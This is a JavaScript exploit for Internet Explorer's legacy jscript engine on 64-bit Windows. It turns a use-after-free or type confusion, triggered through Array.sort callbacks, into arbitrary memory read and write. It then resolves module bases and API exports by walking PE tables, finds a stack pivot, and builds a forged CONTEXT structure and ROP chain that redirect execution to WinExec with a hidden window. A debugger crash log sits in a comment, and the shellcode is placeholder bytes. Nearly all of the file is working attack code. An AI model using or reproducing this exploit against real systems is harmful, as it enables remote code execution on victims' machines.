// find_module_base: Finds the base of a module from a leaked pointer. Works by zeroing the least significant 16 bits of the address and subtracting 0x10000 until the DOS stub code is found at a specified offset.
function find_module_base(ptr, name) {
    ptr.lower = (ptr.lower & 0xFFFF0000) + 0x4e; // Set to starting search point
    while(true) {
        if(read_dword(ptr.lower, ptr.upper) == 0x73696854) { // The string 'This'
            Debug("[+] Found " + name + " base!", true);
            ptr.lower -= 0x4e; // Subtract the offset to get the base
            return ptr;
        }
        ptr.lower -= 0x10000;
    }
}

// leak_module: Used to leak a pointer for a given module that is imported by another module by traversing the PE structure in-memory.
function leak_module(base, target_name_lower, target_name_upper, target_name) {
    // Get IMAGE_NT_HEADERS pointer
    module_lower = base.lower + 0x3c; // PE Header offset location
    module_upper = base.upper;
    file_addr = read_dword(module_lower, module_upper, 1);
    Debug("[+] PE Header offset = 0x" + file_addr.toString(16), true);

    // Get imports
    module_lower = base.lower + file_addr + 0x90; // Import Directory offset location
    import_dir = read_dword(module_lower, module_upper, 1);
    Debug("[+] Import offset = 0x" + import_dir.toString(16), true);

    // Get import size
    module_lower = base.lower + file_addr + 0x94; // Import Directory offset location
    import_size = read_dword(module_lower, module_upper, 1);
    Debug("[+] Size of imports = 0x" + import_size.toString(16), true);

    // Find module
    module_lower = base.lower + import_dir;
    while(import_size != 0) {
        name_ptr = read_dword(module_lower + 0xc, module_upper, 1); // 0xc is the offset to the module name pointer
        if(name_ptr == 0) {
            throw Error("Couldn't find the target module name");
        }
        name_lower = read_dword(base.lower + name_ptr, base.upper);
        name_upper = read_dword(base.lower + name_ptr + 4, base.upper);
        if(name_lower == target_name_lower && name_upper == target_name_upper) {
            Debug("[+] Found the module! Leaking a random module pointer...", true);
            iat = read_dword(module_lower + 0x10, module_upper); // Import Address Table
            leaked_address = read_qword(base.lower + iat + 8, base.upper); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
            Debug("[+] Leaked pointer/addresss from " + target_name + " at upper 0x" + leaked_address.upper.toString(16) + " and lower 0x" + leaked_address.lower.toString(16), false);
            return leaked_address;
        }
        import_size -= 0x14; // The size of each entry
        module_lower += 0x14; // Increase entry pointer
    }
}

function generate_64_bit_formatted_gadget_negative_string(gadget) {
    return String.fromCharCode.apply(null, [gadget & 0xffff, (gadget >> 16) & 0xffff, (0xffffffff >> 32) & 0xffff, (0xffffffff >> 48) & 0xffff]);
}

function generate_64_bit_formatted_gadget_string(gadget) {
    return String.fromCharCode.apply(null, [gadget.lower & 0xffff, (gadget.lower >> 16) & 0xffff, gadget.upper & 0xffff, (gadget.upper >> 16) & 0xffff]);
}

// leak_stack_ptr: Leaks a stack pointer in order to avoid stack pivot detection in the CONTEXT structure.
function leak_stack_ptr() {
    OBJECT_TO_LEAK_A_STACK = new Object(); // Create an object
    OBJECT_TO_LEAK_A_STACK_PTR = get_address_to_given_object(OBJECT_TO_LEAK_A_STACK); // Get address
    csession_addr = read_dword(OBJECT_TO_LEAK_A_STACK_PTR + 24, 0, 1); // Get CSession from offset 24
    stack_addr_lower = read_dword(csession_addr + 80, 0, 1); // Get the lower half of the stack pointer from offset 80
    stack_addr_upper = read_dword(csession_addr + 84, 0, 1); // Get the upper half of the stack pointer from offset 84
    return {'lower': stack_addr_lower, 'upper': stack_addr_upper};
}

// leak_export: Finds the location of a given exported function in a module. Works using binary search in order to speed it up. Assumes that the export name order is alphabetical.
function leak_export(base, target_name_first, target_name_second, target_name_third, target_name_fourth) {
    // Get IMAGE_NT_HEADERS pointer
    module_lower = base.lower + 0x3c; // PE Header offset location
    module_upper = base.upper;
    file_addr = read_dword(module_lower, module_upper, 1);
    Debug("[+] PE Header offset at 0x" + file_addr.toString(16), true);

    // Get exports
    module_lower = base.lower + file_addr + 0x88; // Export Directory offset location
    export_dir = read_dword(module_lower, module_upper, 1);
    Debug("[+] Export offset at 0x" + import_dir.toString(16), true);

    // Get the number of exports
    module_lower = base.lower + export_dir + 0x14; // Number of items offset
    export_num = read_dword(module_lower, module_upper, 1);
    Debug("[+] Export count is " + export_num, true);

    // Get the address offset
    module_lower = base.lower + export_dir + 0x1c; // Address offset
    addresses = read_dword(module_lower, module_upper, 1);
    Debug("[+] Export address offset at 0x" + addresses.toString(16), true);

    // Get the names offset
    module_lower = base.lower + export_dir + 0x20; // Names offset
    names = read_dword(module_lower, module_upper, 1);
    Debug("[+] Export names offset at 0x" + names.toString(16), true);

    // Get the ordinals offset
    module_lower = base.lower + export_dir + 0x24; // Ordinals offset
    ordinals = read_dword(module_lower, module_upper, 1);
    Debug("[+] Export ordinals offset at 0x" + ordinals.toString(16), true);

    // Binary search because linear search is too slow
    upper_limit = export_num; // Largest number in search space
    lower_limit = 0; // Smallest number in search space
    num_pointer = Math.floor(export_num/2);
    module_lower = base.lower + names;
    search_complete = false;

    while(!search_complete) {
        module_lower = base.lower + names + 4*num_pointer; // Point to the name string offset
        function_str_offset = read_dword(module_lower, module_upper, 0); // Get the offset to the name string
        module_lower = base.lower + function_str_offset; // Point to the string
        function_str_lower = read_dword(module_lower, module_upper, 0); // Get the first 4 bytes of the string
        res = compare_nums(target_name_first, function_str_lower);
        if(!res && target_name_second) {
            function_str_second = read_dword(module_lower + 4, module_upper, 0); // Get the next 4 bytes of the string
            res = compare_nums(target_name_second, function_str_second);
            if(!res && target_name_third) {
                function_str_third = read_dword(module_lower + 8, module_upper, 0); // Get the next 4 bytes of the string
                res = compare_nums(target_name_third, function_str_third);
                if(!res && target_name_fourth) {
                    function_str_fourth = read_dword(module_lower + 12, module_upper, 0); // Get the next 4 bytes of the string
                    res = compare_nums(target_name_fourth, function_str_fourth);
                }
            }
        }
        if(!res) { // equal
            module_lower = base.lower + ordinals + 2*num_pointer;
            ordinal = read_word(module_lower, module_upper, 0);
            module_lower = base.lower + addresses + 4*ordinal;
            function_offset = read_dword(module_lower, module_upper, 0);
            Debug("[+] Found target export at offset 0x" + function_offset.toString(16), true);
            return {'lower': base.lower + function_offset, 'upper': base.upper};
        } if(res == 1) {
            if(upper_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            upper_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + lower_limit) / 2);
        } else {
            if(lower_limit == num_pointer) {
                throw Error("Failed to find the target export.");
            }
            lower_limit = num_pointer;
            num_pointer = Math.floor((num_pointer + upper_limit) / 2);
        }
        if(num_pointer == upper_limit && num_pointer == lower_limit) {
            throw Error("Failed to find the target export.");
        }
    }
    throw Error("Failed to find matching export.");
}

// compare_nums: Compares two numbers that represent 4-byte strings for equality. If not, it detects which character is larger or smaller.
function compare_nums(target, current) { // return -1 for target being greater, 0 for equal, 1 for current being greater
    Debug("[*] Comparing 0x" + target.toString(16) + " and 0x" + current.toString(16), true);
    if(target == current) {
        Debug("[+] Equal!", true);
        return 0;
    }
    while(target != 0 && current != 0) {
        if((target & 0xff) > (current & 0xff)) {
            return -1;
        } else if((target & 0xff) < (current & 0xff)) {
            return 1;
        }
        target = target >> 8;
        current = current >> 8;
    }
}

function generate_shellcode() {
    return "\ucccc\ucccc\ucccc\ucccc" +
    "\u4141\u4141\u4141\u4141" + 
    "\u4242\u4242\u4242\u4242" + 
    "\u4141\u4141\u4141\u4141" + 
    "\u4242\u4242\u4242\u4242"
}

function generate_context(command_address, leaked_stack_ptr, kernel32_winexec_export) {
    return "AAAA" + 
    "\u0000\u0000\u0000\u0000" + // P1Home
    "\u0000\u0000\u0000\u0000" + // P2Home
    "\u0000\u0000\u0000\u0000" + // P3Home
    "\u0000\u0000\u0000\u0000" + // P4Home
    "\u0000\u0000\u0000\u0000" + // P5Home
    "\u0000\u0000\u0000\u0000" + // P6Home
    "\u0003\u0010" + // ContextFlags
    "\u0000\u0000" + // MxCsr
    "\u0033" + // SegCs
    "\u0000" + // SegDs
    "\u0000" + // SegEs
    "\u0000" + // SegFs
    "\u0000" + // SegGs
    "\u002b" + // SegSs
    "\u0246\u0000" + // EFlags
    "\u0000\u0000\u0000\u0000" + // Dr0 - Prevents EAF too!
    "\u0000\u0000\u0000\u0000" + // Dr1
    "\u0000\u0000\u0000\u0000" + // Dr2
    "\u0000\u0000\u0000\u0000" + // Dr3
    "\u0000\u0000\u0000\u0000" + // Dr6
    "\u0000\u0000\u0000\u0000" + // Dr7
    "\u0000\u0000\u0000\u0000" + // Rax
    generate_64_bit_formatted_gadget_string(command_address) + // Rcx - Command pointer
    "\u0000\u0000\u0000\u0000" + // Rdx - SW_HIDE
    "\u0000\u0000\u0000\u0000" + // Rbx
    generate_64_bit_formatted_gadget_string(leaked_stack_ptr) + // Rsp - Leaked Stack pointer
    "\u0000\u0000\u0000\u0000" + // Rbp
    "\u0000\u0000\u0000\u0000" + // Rsi
    "\u0000\u0000\u0000\u0000" + // Rdi
    "\u0040\u0000\u0000\u0000" + // R8
    "\u0000\u0000\u0000\u0000" + // R9
    "\u0000\u0000\u0000\u0000" + // R10
    "\u0000\u0000\u0000\u0000" + // R11
    "\u0000\u0000\u0000\u0000" + // R12
    "\u0000\u0000\u0000\u0000" + // R13
    "\u0000\u0000\u0000\u0000" + // R14
    "\u0000\u0000\u0000\u0000" + // R15
    generate_64_bit_formatted_gadget_string(kernel32_winexec_export); // Rip - WinExec() call
    
}

// trigger_exec: Triggers code execution by creating a fake VAR of type 0x81, setting it's vftable to the payload, and causing execution by using typeof.
/*
write_controlled_VVAL_structure(makeVariant(0x81, leak_lower + 96, 0) + makeVariant(0, 0x47474747 + 2 * 3000, 0) + "\u4646"*4000);
0:008> g
(930.9e8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
jscript!CScriptRuntime::TypeOf+0x19d9d:
000007fe`f62360e5 488b9838010000  mov     rbx,qword ptr [rax+138h] ds:00000000`47475fef=????????????????
0:000> u eip
jscript!CScriptRuntime::TypeOf+0x19d9d:
000007fe`f62360e5 488b9838010000  mov     rbx,qword ptr [rax+138h]
000007fe`f62360ec 488bcb          mov     rcx,rbx
000007fe`f62360ef ff156b250700    call    qword ptr [jscript!_guard_check_icall_fptr (000007fe`f62a8660)]
000007fe`f62360f5 488bcf          mov     rcx,rdi
000007fe`f62360f8 ffd3            call    rbx
000007fe`f62360fa 85c0            test    eax,eax
000007fe`f62360fc 0f841d63feff    je      jscript!CScriptRuntime::TypeOf+0xd7 (000007fe`f621c41f)
000007fe`f6236102 488d0de7510600  lea     rcx,[jscript!cbstrFunctionType (000007fe`f629b2f0)]
0x47474747: obj_addr
0x46464646: command_address, leaked_stack_ptr, kernel32_winexec_export...

We will put whatever rax+138 is pointing to to ebx
*/
function trigger_exec(we_will_call_a_pointer_here, command_address, leaked_stack_ptr, kernel32_winexec_export) {
    write_controlled_VVAL_structure(makeVariant(0x81, leak_lower + 96, 0) + makeVariant(0, we_will_call_a_pointer_here + 2*PADDING_FOR_CONTEXT, 0) + generate_context(command_address, leaked_stack_ptr, kernel32_winexec_export));
    Debug("[*] About to trigger...", false);
    typeof OBJ_FOR_ARBITRARY_READS_AND_WRITES;
}

function find_pivot() {
    msvcrt_system_export = leak_export(msvcrt_base, 0x74737973, 0, 0, 0);
    pivot_offset = 0;
    while(pivot_offset < 0x150) {
        word_at_offset = read_word(msvcrt_system_export.lower + pivot_offset, msvcrt_system_export.upper);
        if(word_at_offset == 0xc394) { // Little-Endian order
            break;
        }
        pivot_offset += 1;
    }
    if(pivot_offset == 0x150) { // Maximum search range
        throw Error("Failed to find pivot");
    }
    Debug("[+] Pivot found at offset 0x" + pivot_offset.toString(16), false);
    return {'lower': msvcrt_system_export.lower + pivot_offset, 'upper': msvcrt_system_export.upper};
}

/*
1. leak a pointer to VVAL structure
2. find VVAL structure which we can control, make sure we can control the value portion of the key-value pair
3. make sure we can control the key portion of the key-value pair
4. gain control over the VVAL structure
5. create read primative by writing to the value of the kvp, then writing the key of the kvp, then reading the key of the kvp via length()
6. create a javascript obj, read the address of the obj by first writing the value of the kvp as the obj, and writing the key of the kvp to point to the obj location, then reading it
*/
function main() {
    //legacyResetFunction();
    reset();

    //createVariantForFloatTypeConfusionByAddingAFloatVar();
    createVariantForFloatTypeConfusionByCreatingAVval(); 
    [0,0].sort(uaf_type_confusion_exploit);
    get_var_obj_ptr_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_via_float_type_confusion();
    
    overlay_backup = overlay
    reset(); 
    set_variants(0x80, leak_lower); // this guy points to "A" VVAL property which hence points to the VAR structure, when you hit a "number" which is actually a bstr string
    [1,1].sort(uaf_type_confusion_exploit);
    get_index_to_PROPERTY_NAME_WHOSE_VALUE_WILL_BE_LEAKED_STATIC_via_bstr_var_type_confusion_obj_pointer()
    test_write_controlled_VVAL_structure(50)

    var use_me_to_find_obj = 1234
    write_controlled_VVAL_structure(makeVariant(3, use_me_to_find_obj)); // set last property name to a int VAR 
    reset();
    set_variants(0x80, leak_lower + 64); // point to the name string of the "A" VVAL structure, which in thise case is lots of INT VAR 1234s
    [0,0].sort(uaf_type_confusion_exploit); 
    get_obj_through_the_name_of_the_last_VVAL_structure_via_int_type_confusion_obj_pointer(use_me_to_find_obj) // if the name which we are pointing to is a float var, and that is equal to use_me_to_find_obj, then we have found our object
    
    var use_me_to_test_obj = 56
    set_variants(0x80, leak_lower + 64); 
    test_obj(use_me_to_test_obj)
    test_read_bwdq()

    OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT = new Object();
    OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT_PTR = get_address_to_given_object(OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT)
    Debug("[+] Create Jscript.dll new Object(), ptr to this at 0x" + OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT_PTR.toString(16), false);
    vftable_addr = read_qword(OBJECT_TO_LEAK_A_VFTABLE_TO_LEAK_JSCRIPT_PTR, 0, 0x44444444);
    Debug("[+] Vftable at upper 0x" + vftable_addr.upper.toString(16) + " and lower 0x" + vftable_addr.lower.toString(16), false);
    jscript_base = find_module_base(vftable_addr, "jscript.dll");
    Debug("[+] Found jscript.dll base at 0x" + jscript_base.upper.toString(16) + " 0x" + jscript_base.lower.toString(16), false);

    // Get the msvcrt base by following the jscript import table
    // msvcrt.d
    mscvcrt_leak = leak_module(jscript_base, 0x6376736d, 0x642e7472, "msvcrt.dll");
    msvcrt_base = find_module_base(mscvcrt_leak, "msvcrt.dll");
    Debug("[+] Found msvcrt base at 0x" + msvcrt_base.upper.toString(16) + " 0x" + msvcrt_base.lower.toString(16), false);

    // Get the ntdll base by following the msvcrt import table
    // ntdll.dl
    ntdll_leak = leak_module(msvcrt_base, 0x6c64746e, 0x6c642e6c, "ntdll.dll");
    ntdll_base = find_module_base(ntdll_leak, "ntdll.dll");
    Debug("[+] Found ntdll at 0x" + ntdll_base.upper.toString(16) + " 0x" + ntdll_base.lower.toString(16), false);

    // Get the kernel32 base by following the jscript import table
    // KERNEL32
    kernel32_leak = leak_module(jscript_base, 0x4e52454b, 0x32334c45, "kernel32.dll");
    kernel32_base = find_module_base(kernel32_leak, "kernel32.dll");
    Debug("[+] Found kernel32 at 0x" + kernel32_base.upper.toString(16) + " 0x" + kernel32_base.lower.toString(16), false);

    // Find NtContinue, a valid API
    ntdll_ntcontinue_export = leak_export(ntdll_base, 0x6f43744e, 0x6e69746e, 0, 0);
    Debug("[+] Found NtContinue at 0x" + ntdll_ntcontinue_export.upper.toString(16) + " 0x" + ntdll_ntcontinue_export.lower.toString(16), false);

    kernel32_virtualprotect_export = leak_export(kernel32_base, 0x74726956, 0x506C6175, 0, 0);
    Debug("[+] Found VirtualProtect at 0x" + kernel32_virtualprotect_export.upper.toString(16) + " 0x" + kernel32_virtualprotect_export.lower.toString(16));

    //leaked_stack_ptr = leak_stack_ptr();
    pivot_xchg_eax_esp_ret = find_pivot();

    context_object = generate_context({"lower":0x43434343, "upper": 0x44444444}, {"lower":0x45454545, "upper": 0x46464646}, {"lower":0x47474747, "upper": 0x48484848})
    context_object = context_object.substr(0, context_object.length); // Make the context string reallocate
    //context_address = get_address_to_given_string(context_object) + 8;

    context_object_ptr = get_address_to_given_string(context_object);
    Debug("[+] Context object at 0x" + context_object_ptr.upper.toString(16) + " 0x" + context_object_ptr.lower.toString(16), false);
  
    //context_object_ptr = get_address_to_given_object(context_object);
    //Debug("[+] Trigger object at 0x" + context_object_ptr.toString(16) + " 0x" + context_object_ptr.toString(16), false);

    context_object_ptr = context_object_ptr.lower + 8 // need to be 6 byte aligned
    Debug("[+] Context object at 0x" + context_object_ptr.toString(16) + " 0x" + context_object_ptr.toString(16), false);
  

    // this is to control EIP
    OBJECT_TO_HIJACK_EIP = create_virtual_protect_rop(ntdll_base.lower, context_object_ptr, ntdll_ntcontinue_export.lower)
    //OBJECT_TO_HIJACK_EIP = generate_64_bit_formatted_gadget_string({"lower":0x44444444, "upper": 0x44444444})
    while (OBJECT_TO_HIJACK_EIP.length < 0x138/2) OBJECT_TO_HIJACK_EIP += generate_64_bit_formatted_gadget_string({"lower":0x44444444, "upper": 0x44444444})
    OBJECT_TO_HIJACK_EIP += generate_64_bit_formatted_gadget_string(pivot_xchg_eax_esp_ret)
    while (OBJECT_TO_HIJACK_EIP.length < 0x1000) OBJECT_TO_HIJACK_EIP += generate_64_bit_formatted_gadget_string(ntdll_ntcontinue_export)
    OBJECT_TO_HIJACK_EIP = OBJECT_TO_HIJACK_EIP.substr(0, OBJECT_TO_HIJACK_EIP.length);
    OBJECT_TO_HIJACK_EIP_PTR = get_address_to_given_string(OBJECT_TO_HIJACK_EIP);
    Debug("[+] Trigger object at 0x" + OBJECT_TO_HIJACK_EIP_PTR.upper.toString(16) + " 0x" + OBJECT_TO_HIJACK_EIP_PTR.lower.toString(16), false);

/*
    OBJECT_TO_HIJACK_EIP = Array(PADDING_FOR_CONTEXT + 1).join('A'); // Adds lots of stack space to either side to prevent msvcrt.dll crashing
    OBJECT_TO_HIJACK_EIP = OBJECT_TO_HIJACK_EIP + Array(157).join('A') + generate_64_bit_formatted_gadget_string(ntdll_ntcontinue_export);
    // the reason why we need another (157-1)*2 buffer is because we are mov rbx, [rax+138h]
    OBJECT_TO_HIJACK_EIP = OBJECT_TO_HIJACK_EIP.substr(0, OBJECT_TO_HIJACK_EIP.length);
    OBJECT_TO_HIJACK_EIP_PTR = get_address_to_given_string(OBJECT_TO_HIJACK_EIP);
*/

    write_controlled_VVAL_structure(makeVariant(0x81, leak_lower + 96, 0) + 
        makeVariant(0, OBJECT_TO_HIJACK_EIP_PTR.lower, 0) + 
        context_object,
        0x21212121
    );
    Debug("[*] About to trigger...", false);
    typeof OBJ_FOR_ARBITRARY_READS_AND_WRITES;
}

function create_virtual_protect_rop(ntdll_base, pointer_to_context, ntcontinue) {
    var rop = ""

    rop += generate_64_bit_formatted_gadget_string({"lower":ntdll_base+0x5909c, "upper": 0x00000000}) // pop rcx ; ret
    rop += generate_64_bit_formatted_gadget_string({"lower":pointer_to_context, "upper": 0x00000000})   // return address
    rop += generate_64_bit_formatted_gadget_string({"lower":ntcontinue, "upper": 0x00000000})   // return address

    rop = rop.substr(0, rop.length);
    return rop;
}

main();